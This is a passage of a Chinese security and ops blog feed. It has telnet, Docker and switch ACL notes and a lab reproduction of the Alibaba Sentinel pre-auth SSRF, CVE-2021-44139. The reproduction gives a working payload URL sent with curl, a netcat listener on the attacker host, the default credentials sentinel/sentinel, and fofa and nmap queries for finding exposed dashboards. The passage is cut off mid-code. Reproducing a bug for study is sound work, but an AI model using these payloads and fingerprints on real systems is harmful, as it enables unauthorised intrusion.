href="https://mrwq.github.io/aggregate-paper/butian/Alibaba%20Sentinel%20SSRF%E6%BC%8F%E6%B4%9E(CVE-2021-44139)%E6%B5%85%E6%9E%90/">https://mrwq.github.io/aggregate-paper/butian/Alibaba%20Sentinel%20SSRF%E6%BC%8F%E6%B4%9E(CVE-2021-44139)%E6%B5%85%E6%9E%90/</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secvulns</category>
      
      <category>yunweivulns</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secvulns</tag>
      
      <tag>yunweivulns</tag>
      
      <tag>weakpassword</tag>
      
      <tag>ftp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>telnet_weak_password</title>
    <link href="/2024/03/04/security/secvulns/telnet/telnet_weak_password/"/>
    <url>/2024/03/04/security/secvulns/telnet/telnet_weak_password/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h3><h4 id="用户视图"><a href="#用户视图" class="headerlink" title="&lt;主机名&gt;  用户视图"></a>&lt;主机名&gt;  用户视图</h4><p>telnet  默认进入的视图，CTRL+Z可以从系统视图切换到用户视图</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs markdown">➜  ~ telnet 10.211.255.51<br>Trying 10.211.255.51...<br>Connected to 10.211.255.51.<br>Escape character is &#x27;^]&#x27;.<br>Login: username<br>Password: <br><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span>**<br><span class="hljs-bullet">*</span> Copyright (c) 2004-2019 New H3C Technologies Co., Ltd. All rights reserved.*<br><span class="hljs-bullet">*</span> Without the owner&#x27;s prior written consent,                                 *<br><span class="hljs-bullet">*</span> no decompiling or reverse-engineering shall be allowed.                    *<br><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span>**<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">lvs_test</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h4 id="主机名-系统视图"><a href="#主机名-系统视图" class="headerlink" title="[主机名] 系统视图"></a>[主机名] 系统视图</h4><p>用户视图中通过 system-view 命令进入系统视图</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&lt;lvs_test&gt;sys<br>&lt;lvs_test&gt;<span class="hljs-keyword">system</span>-<span class="hljs-keyword">view</span> <br><span class="hljs-keyword">System</span> <span class="hljs-keyword">View</span>: <span class="hljs-keyword">return</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">User</span> <span class="hljs-keyword">View</span> <span class="hljs-keyword">with</span> Ctrl+Z.<br>[lvs_test]<br></code></pre></td></tr></table></figure><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><h4 id="display-clock-查看时间"><a href="#display-clock-查看时间" class="headerlink" title="display clock 查看时间"></a>display clock 查看时间</h4><p>用户和系统模式均可执行</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[lvs_test]</span><span class="hljs-attribute">display</span> clock<br><span class="hljs-number">23</span>:<span class="hljs-number">45</span>:<span class="hljs-number">34.614</span> UTC Tue <span class="hljs-number">01</span>/<span class="hljs-number">02</span>/<span class="hljs-number">2001</span><br></code></pre></td></tr></table></figure><h4 id="display-current-configuration"><a href="#display-current-configuration" class="headerlink" title="display current-configuration"></a>display current-configuration</h4><p>用户和系统模式均可执行</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs routeros">[lvs_test]display current-configuration<br><span class="hljs-comment">#</span><br> version 7.1.070, Release 6555P01<br><span class="hljs-comment">#</span><br> sysname lvs_test<br><span class="hljs-comment">#</span><br> telnet<span class="hljs-built_in"> server </span><span class="hljs-built_in">enable</span><br><span class="hljs-comment">#</span><br> irf mac-address persistent timer<br> irf auto-update <span class="hljs-built_in">enable</span><br> undo irf link-delay<br> irf member 1 priority 1<br><span class="hljs-comment">#</span><br> parity-<span class="hljs-built_in">error</span> unrecoverable log <span class="hljs-built_in">enable</span><br><span class="hljs-comment">#</span><br> mac-address timer aging 100000<br><span class="hljs-comment">#</span><br> lldp global <span class="hljs-built_in">enable</span><br><span class="hljs-comment">#</span><br> system-working-mode standard<br> password-recovery enable<br></code></pre></td></tr></table></figure><h2 id="报错信息"><a href="#报错信息" class="headerlink" title="报错信息"></a>报错信息</h2><h3 id="Unrecognized-command-found-at-position"><a href="#Unrecognized-command-found-at-position" class="headerlink" title="Unrecognized command found at  position"></a>Unrecognized command found at  position</h3><h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>视图不对，通过CTRL+Z或者system-view切换视图</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secvulns</category>
      
      <category>yunweivulns</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secvulns</tag>
      
      <tag>yunweivulns</tag>
      
      <tag>weakpassword</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker_tips</title>
    <link href="/2024/02/28/yunwei/applications/docker/docker_tips/"/>
    <url>/2024/02/28/yunwei/applications/docker/docker_tips/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>命令基于 mac Docker Desktop 4.11.1 (84025) </p><h3 id="查询指定镜像仓库镜像列表"><a href="#查询指定镜像仓库镜像列表" class="headerlink" title="查询指定镜像仓库镜像列表"></a>查询指定镜像仓库镜像列表</h3><p><strong>Curl</strong></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">curl -X <span class="hljs-symbol">&#x27;GET</span><span class="hljs-string">&#x27; &#x27;</span>h__ps://demo.goharbor.io/api/v2.<span class="hljs-number">0</span>/projects?page=<span class="hljs-number">1</span>&amp;page_size=<span class="hljs-number">10</span>&amp;with_detail=<span class="hljs-literal">true</span>&#x27;  -H <span class="hljs-symbol">&#x27;accept</span>: application/json&#x27;<br></code></pre></td></tr></table></figure><p><strong>Request URL</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://demo.goharbor.io/api/v2.<span class="hljs-number">0</span>/projects?page=<span class="hljs-number">1</span>&amp;page_size=<span class="hljs-number">10</span>&amp;with_detail=true<br></code></pre></td></tr></table></figure><p>q&#x3D;string   </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">格式<span class="hljs-attribute">q</span>=k=v <br><span class="hljs-attribute">q</span>=name=admin 精确匹配<br><span class="hljs-attribute">q</span>=name=~admin 模糊匹配<br></code></pre></td></tr></table></figure><p>q&#x3D;name&#x3D;admin</p><p>page&#x3D;interger</p><p>page_size&#x3D;interger</p><p>name&#x3D;string 指定项目</p><p>sort&#x3D;string  指定排序字段</p><p>public&#x3D;boolean  指定查询公开项目还是私有项目，默认公开项目</p><p>owner&#x3D;string  指定作者</p><p>with_detail&#x3D;boolean  指定是否需要展示详情</p><h3 id="查询指定镜像仓库指定镜像"><a href="#查询指定镜像仓库指定镜像" class="headerlink" title="查询指定镜像仓库指定镜像"></a>查询指定镜像仓库指定镜像</h3><p><strong>CURL</strong></p><p>curl -X ‘GET’ ‘h__ps:&#x2F;&#x2F;demo.goharbor.io&#x2F;api&#x2F;v2.0&#x2F;search?q&#x3D;1’ -H ‘accept: application&#x2F;json’</p><p><strong>Request URL</strong></p><p>h__ps:&#x2F;&#x2F;demo.goharbor.io&#x2F;api&#x2F;v2.0&#x2F;search?q&#x3D;1</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
      <category>docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>docker</tag>
      
      <tag>tips</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>switch_rules</title>
    <link href="/2024/02/26/yunwei/switch/switch_rules/"/>
    <url>/2024/02/26/yunwei/switch/switch_rules/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>基本ACL支持根据源IP地址过滤报文，高级ACL不仅支持源IP地址，还支持根据目的IP地址过滤报文</p><p>策略执行顺序</p><p>从上往下</p><p>首次匹配</p><p>一旦有规则匹配到了数据包，交换机就会执行该规则指定的操作，并停止继续检查其他规则。这意味着如果ACL中的某个规则匹配了数据包，后面的规则就不会再被考虑。</p><p>默认策略</p><p>如果数据包没有匹配到任何ACL策略，交换机会按照默认策略处理，也就是需要在策略最后添加默认允许或默认拒绝</p><p>格式</p><p>access-list &lt;编号&gt; &lt;策略&gt; &lt;协议&gt; &lt;源地址&gt; &lt;源地址掩码&gt; &lt;目标地址&gt; &lt;目标地址掩码&gt; [&lt;源端口&gt; &lt;目标端口&gt; ]</p><p>语法</p><p>必须</p><p>access-list: 表示创建或编辑ACL规则</p><p>编号：ACL编号，用于区分不同的ACL规则，（范围通常为100-199（扩展ACL）或2000-2699（基于时间的ACL））需要确认的点</p><p>策略：指定访问控制的行为，包含permit（允许）和 deny （拒绝）两种策略</p><p>协议：指定需要匹配的协议类型，例如TCP、UDP、ICMP、IP（表示任何IP层协议，协议号的取值可以是1~255）等</p><p>源地址：指定访问控制来源IP地址</p><p>源地址掩码：指定访问控制来源IP地址的子网范围</p><p>目标地址：指定访问控制目的IP地址</p><p>目标地址掩码：指定访问控制目的IP地址的子网范围</p><p>可选</p><p>源端口  目标端口 ：TCP和UDP协议支持指定端口，比较符 eq port 等于，gt port 大于，lt port 小于，range startport endport 端口范围</p><p>可以写具体端口，也可以写常用服务（www）</p><p>常见TCP端口对应字符串</p><table><thead><tr><th><strong>端口号</strong></th><th><strong>字符串</strong></th><th><strong>协议</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>7</td><td>echo</td><td>Echo</td><td>计算机命令</td></tr><tr><td>9</td><td>discard</td><td>Discard</td><td>用于连接测试的空服务</td></tr><tr><td>13</td><td>daytime</td><td>Daytime</td><td>给请求主机发送日期和时间</td></tr><tr><td>19</td><td>CHARgen</td><td>Character generator</td><td>字符生成服务；发送无止境的字符流</td></tr><tr><td>20</td><td>ftp-data</td><td>FTP data connections</td><td>FTP数据端口</td></tr><tr><td>21</td><td>ftp</td><td>File Transfer Protocol(FTP)</td><td>文件传输协议（FTP）端口</td></tr><tr><td>23</td><td>telnet</td><td>Telnet</td><td>Telnet服务</td></tr><tr><td>25</td><td>smtp</td><td>Simple Mail Transport Protocol(SMTP)</td><td>简单邮件传输协议</td></tr><tr><td>37</td><td>time</td><td>Time</td><td>时间协议</td></tr><tr><td>43</td><td>whois</td><td>Nickname（WHOIS）</td><td>目录服务</td></tr><tr><td>49</td><td>tacacs</td><td>TAC Access Control System (TACACS)</td><td>用于基于TCP&#x2F;IP验证和访问的访问控制系统（TACACS登录主机协议）</td></tr><tr><td>53</td><td>domain</td><td>Domain Name Service(DNS)</td><td>域名服务</td></tr><tr><td>70</td><td>gopher</td><td>Gopher</td><td>信息检索协议（互联网文档搜寻和检索）</td></tr><tr><td>79</td><td>finger</td><td>Finger</td><td>用于用户联系信息的Finger服务，查询远程主机在线用户等信息</td></tr><tr><td>80</td><td>www</td><td>World Wide Web(HTTP)</td><td>用于万维网（WWW）服务的超文本传输协议（HTTP），用于网页浏览</td></tr><tr><td>101</td><td>hostname</td><td>NIC hostname server</td><td>NIC机器上的主机名服务</td></tr><tr><td>109</td><td>pop2</td><td>Post Office Protocol v2</td><td>邮件协议-版本2</td></tr><tr><td>110</td><td>pop3</td><td>Post Office Protocol v3</td><td>邮件协议-版本3</td></tr><tr><td>111</td><td>sunrpc</td><td>Sun Remote Procedure Call (RPC)</td><td>SUN公司的远程过程调用（RPC）协议，用于远程命令执行，被网络文件系统（NFS）使用</td></tr><tr><td>119</td><td>nntp</td><td>Network News Transport Protocol(NNTP)</td><td>网络新闻传输协议，承载USENET通信</td></tr><tr><td>179</td><td>bgp</td><td>Border Gateway Protocol (BGP)</td><td>边界网关协议</td></tr><tr><td>194</td><td>irc</td><td>Internet Relay Chat(IRC)</td><td>互联网中继聊天（多线交谈协议）</td></tr><tr><td>512</td><td>exec</td><td>Exec (rsh)</td><td>用于对远程执行的进程进行验证</td></tr><tr><td>513</td><td>login</td><td>Login (rlogin)</td><td>远程登录</td></tr><tr><td>514</td><td>cmd</td><td>Remote commands</td><td>远程命令，不必登录的远程shell（rshell）和远程复制（rcp）</td></tr><tr><td>515</td><td>lpd</td><td>Printer service</td><td>打印机（lpr）假脱机</td></tr><tr><td>517</td><td>talk</td><td>Talk</td><td>远程对话服务和客户</td></tr><tr><td>540</td><td>uucp</td><td>Unix-to-Unix Copy Program</td><td>Unix到Unix复制服务</td></tr><tr><td>543</td><td>klogin</td><td>Kerberos login</td><td>Kerberos版本5 （v5）远程登录</td></tr><tr><td>544</td><td>kshell</td><td>Kerberos shell</td><td>Kerberos版本5 （v5）远程shell</td></tr></tbody></table><p>常见UDP端口对应字符串</p><table><thead><tr><th>端口号</th><th>字符串</th><th>协议</th><th>说明</th></tr></thead><tbody><tr><td>7</td><td>echo</td><td>Echo</td><td>计算机命令</td></tr><tr><td>9</td><td>discard</td><td>Discard</td><td>用于连接测试的空服务</td></tr><tr><td>37</td><td>time</td><td>Time</td><td>时间协议</td></tr><tr><td>42</td><td>nameserver</td><td>Host Name Server</td><td>主机名服务</td></tr><tr><td>53</td><td>dns</td><td>Domain Name Service (DNS)</td><td>域名服务</td></tr><tr><td>65</td><td>tacacs-ds</td><td>TACACS-Database Service</td><td>TACACS数据库服务</td></tr><tr><td>67</td><td>bootps</td><td>Bootstrap Protocol Server</td><td>引导程序协议 （BOOTP）服务端， DHCP服务使用</td></tr><tr><td>68</td><td>bootpc</td><td>Bootstrap Protocol Client</td><td>引导程序协议 （BOOTP）客户端， DHCP客户使用</td></tr><tr><td>69</td><td>tftp</td><td>Trivial File Transfer Protocol (TFTP)</td><td>小文件传输协议</td></tr><tr><td>90</td><td>dnsix</td><td>DNSIX Security Attribute Token Map</td><td>DNSIX安全属性标记图</td></tr><tr><td>111</td><td>sunrpc</td><td>SUN Remote Procedure Call (SUN RPC)</td><td>SUN公司的远程过程调用（RPC）协议， 用于远程命令执行， 被网络文件系统（NFS）使用</td></tr><tr><td>123</td><td>ntp</td><td>Network Time Protocol (NTP)</td><td>网络时间协议，蠕虫病毒会利用</td></tr><tr><td>137</td><td>netbios-ns</td><td>NETBIOS Name Service</td><td>NETBIOS名称服务</td></tr><tr><td>138</td><td>netbios-dgm</td><td>NETBIOS Datagram Service</td><td>NETBIOS数据报服务</td></tr><tr><td>139</td><td>netbios-ssn</td><td>NETBIOS Session Service</td><td>NETBIOS会话服务</td></tr><tr><td>161</td><td>snmp</td><td>SNMP</td><td>简单网络管理协议</td></tr><tr><td>162</td><td>snmptrap</td><td>SNMPTRAP</td><td>SNMP陷阱</td></tr><tr><td>177</td><td>xdmcp</td><td>X Display Manager Control Protocol (XDMCP)</td><td>X显示管理器控制协议</td></tr><tr><td>434</td><td>mobilip-ag</td><td>MobileIP-Agent</td><td>移动IP代理</td></tr><tr><td>435</td><td>mobilip-mn</td><td>MobileIP-MN</td><td>移动IP管理</td></tr><tr><td>512</td><td>biff</td><td>Mail notify</td><td>异步邮件，可用来通知用户有邮件到达</td></tr><tr><td>513</td><td>who</td><td>Who</td><td>登录的用户列表</td></tr><tr><td>514</td><td>syslog</td><td>Syslog</td><td>UNIX系统日志服务</td></tr><tr><td>517</td><td>talk</td><td>Talk</td><td>远程对话服务器和客户端</td></tr><tr><td>520</td><td>rip</td><td>Routing Information Protocol</td><td>RIP路由协议</td></tr></tbody></table><p>掩码说明</p><p>IP地址通配符掩码与IP地址的反向子网掩码类似，也是一个32比特位的数字字符串，用于指示IP地址中的哪些位将被检查。各比特位中，“0”表示“检查相应的位”，“1”表示“不检查相应的位”，概括为一句话就是“检查0，忽略1”。但与IP地址子网掩码不同的是，子网掩码中的“0”和“1”要求必须连续，而通配符掩码中的“0”和“1”可以不连续。</p><p>通配符掩码可以为0，相当于0.0.0.0，表示源&#x2F;目的地址为主机地址；也可以为255.255.255.255，表示任意IP地址，相当于指定<strong>any</strong>参数</p><p>例如：</p><p>匹配 192.168.1.0&#x2F;24 ，可以写为 192.168.1.0 0.0.0.255，也就是只检查前24个比特位</p><p>实例：</p><p>允许特定源、目的IP之间 3306 端口的TCP流量</p><p>rule 5 permit tcp source 10.122.1.1 0 destination 172.16.1.1 0 destination-port eq 3306</p><p>规则编号：rule 5</p><p>策略：permit（允许）</p><p>协议：TCP</p><p>源地址：10.122.1.1</p><p>源地址掩码：0  通配符掩码，0表示必须精确匹配源地址</p><p>目标地址：172.16.1.1 </p><p>目的地址掩码：0  通配符掩码，0表示必须精确匹配目标地址</p><p>目标端口：eq（等于） 3306</p><p>允许ICMP协议数据包通过</p><p>rule 500 permit icmp</p><p>允许ICMP Echo请求数据包通过</p><p>rule 501 permit icmp icmp-type echo</p><p>允许ICMP Echo Reply 响应数据包通过，ICMP Echo Reply 是对 ICMP Echo 请求的响应，用于确认网络连接和诊断网络延迟</p><p>rule 502 permit icmp icmp-type echo-reply </p><p>允许ICMP port-unreachable 数据包通过，即目标端口不可达时，主机会发送 ICMP port-unreachable 消息作为响应</p><p>rule 503 permit icmp icmp-type port-unreachable </p><p>允许ICMP ttl-exceeded 数据包通过，即数据包TTL（Time to Live）字段减到0时，路由器会丢弃该数据包，并向源主机发送ICMP ttl-exceeded数据包</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>switch</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>switch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Alibaba_Sentinel_SSRF_CVE-2021-44139</title>
    <link href="/2024/02/21/security/secvulns/alibaba%20Sentinel/Alibaba_Sentinel_SSRF_CVE-2021-44139/"/>
    <url>/2024/02/21/security/secvulns/alibaba%20Sentinel/Alibaba_Sentinel_SSRF_CVE-2021-44139/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="漏洞名称"><a href="#漏洞名称" class="headerlink" title="漏洞名称"></a>漏洞名称</h2><p>alibaba hashicorp sentinel 服务端请求伪造（ssrf）</p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Alibaba开源限流熔断组件Sentinel中的管控平台sentinel-dashboard存在认证前SSRF漏洞，恶意用户无需认证即可通过该接口进行SSRF攻击。</p><h2 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h2><p>CVE-2021-44139</p><h2 id="漏洞级别"><a href="#漏洞级别" class="headerlink" title="漏洞级别"></a>漏洞级别</h2><p>高危</p><h2 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h2><p>1.8.2版本</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>升级到最新版本</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h3><p>1、下载 1.8.2 版本jar包</p><p>首页-&gt;Tags-&gt;1.8.2</p><p>h__ps:&#x2F;&#x2F;github.com&#x2F;alibaba&#x2F;Sentinel&#x2F;releases&#x2F;tag&#x2F;1.8.2</p><p>2、启动服务</p><p>java -jar sentinel-dashboard-1.8.2.jar</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">➜  Alibaba_Sentinel_SSRF_CVE-2021-44139 java -jar sentinel-dashboard-1.8.2.jar<br>INFO: Sentinel log output type is: file<br>INFO: Sentinel log charset is: utf-8<br>INFO: Sentinel log base directory is: /Users/admin/logs/csp/<br>INFO: Sentinel log name use pid is: false<br><br>  .   ____          _            __ _ _<br> /\\ / ___&#x27;_ __ _ _(_)_ __  __ _ \ \ \ \<br>( ( )\___ |<span class="hljs-string"> &#x27;_ </span>|<span class="hljs-string"> &#x27;_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> &#x27;_ \/ _` </span>|<span class="hljs-string"> \ \ \ \</span><br><span class="hljs-string"> \\/  ___)</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_)</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>||<span class="hljs-string"> (_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">  ) ) ) )</span><br><span class="hljs-string">  &#x27;  </span>|<span class="hljs-string">____</span>|<span class="hljs-string"> .__</span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_\__, </span>|<span class="hljs-string"> / / / /</span><br><span class="hljs-string"> =========</span>|<span class="hljs-string">_</span>|<span class="hljs-string">==============</span>|<span class="hljs-string">___/=/_/_/_/</span><br><span class="hljs-string"> :: Spring Boot ::        (v2.0.5.RELEASE)</span><br><span class="hljs-string"></span><br><span class="hljs-string">2024-02-22 19:48:59.528  INFO 6822 --- [           main] c.a.c.s.dashboard.DashboardApplication   : Starting DashboardApplication on 110.local with PID 6822 (/Users/admin/codes/vulncodes/Alibaba_Sentinel_SSRF_CVE-2021-44139/sentinel-dashboard-1.8.2.jar started by admin in /Users/admin/codes/vulncodes/Alibaba_Sentinel_SSRF_CVE-2021-44139)</span><br></code></pre></td></tr></table></figure><p>3、访问服务</p><p>默认端口 8080</p><p>h__p:&#x2F;&#x2F;10.222.28.10:8080&#x2F;#&#x2F;login</p><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>1、攻击主机 10.235.151.11（Windows） 监听 80 端口</p><p>nc64.exe -lp 80</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">D</span>:\nc\netcat-win32-<span class="hljs-number">1</span>.<span class="hljs-number">12</span>&gt;nc64.exe -lp <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p>2、构造Payload</p><p>h__p:&#x2F;&#x2F;ip&#x2F;registry&#x2F;machine?app&#x3D;40bdb&amp;appType&#x3D;0&amp;version&#x3D;0&amp;hostname&#x3D;VbxGe&amp;ip&#x3D;attackip&amp;port&#x3D;0</p><p>ip 替换为被攻击主机，部署服务的主机 10.222.28.10</p><p>attackip 替换为攻击主机 10.235.151.11</p><p>h__p:&#x2F;&#x2F;10.222.28.10:8080&#x2F;registry&#x2F;machine?app&#x3D;40bdb&amp;appType&#x3D;0&amp;version&#x3D;0&amp;hostname&#x3D;VbxGe&amp;ip&#x3D;10.235.151.11&amp;port&#x3D;0</p><p>3、执行payload</p><p>10.222.28.10:8080&#x2F;registry&#x2F;machine?app&#x3D;40bdb&amp;appType&#x3D;0&amp;version&#x3D;0&amp;hostname&#x3D;VbxGe&amp;ip&#x3D;10.235.151.11&amp;port&#x3D;0</p><p>curl “<a href="http://10.222.28.10:8080/registry/machine?app=40bdb&appType=0&version=0&hostname=VbxGe&ip=10.235.151.11&port=0">http://10.222.28.10:8080/registry/machine?app=40bdb&amp;appType=0&amp;version=0&amp;hostname=VbxGe&amp;ip=10.235.151.11&amp;port=0</a>“</p><p>4、攻击结果</p><p>攻击主机监听的 80 会收到来自被攻击主机的请求</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">D</span>:\nc\netcat-win32-<span class="hljs-number">1</span>.<span class="hljs-number">12</span>&gt;nc64.exe -lp <span class="hljs-number">80</span><br><span class="hljs-attribute">GET</span> /metric?startTime=<span class="hljs-number">1708654313000</span>&amp;endTime=<span class="hljs-number">1708654319000</span>&amp;refetch=false HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Connection</span>: Close<br><span class="hljs-attribute">Host</span>: <span class="hljs-number">10.235.151.11:0</span><br><span class="hljs-attribute">User</span>-Agent: Apache-HttpAsyncClient/<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">3</span> (Java/<span class="hljs-number">11.0.15.1</span>)<br></code></pre></td></tr></table></figure><p>payload 访问结果</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;success&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;code&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;msg&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;success&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;data&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><h3 id="默认信息"><a href="#默认信息" class="headerlink" title="默认信息"></a>默认信息</h3><p>默认端口 8080</p><p>默认密码 sentinel&#x2F;sentinel</p><h3 id="服务指纹"><a href="#服务指纹" class="headerlink" title="服务指纹"></a>服务指纹</h3><p>title：Sentinel Dashboard</p><h3 id="服务查询"><a href="#服务查询" class="headerlink" title="服务查询"></a>服务查询</h3><h4 id="fofa-info"><a href="#fofa-info" class="headerlink" title="fofa.info"></a>fofa.info</h4><p>“title: Sentinel Dashboard”</p><h4 id="nmap检测"><a href="#nmap检测" class="headerlink" title="nmap检测"></a>nmap检测</h4><p>nmap -A 进行探测 ，SERVER 为 http-proxy ，页面中包含 “Sentinel Dashboard”</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 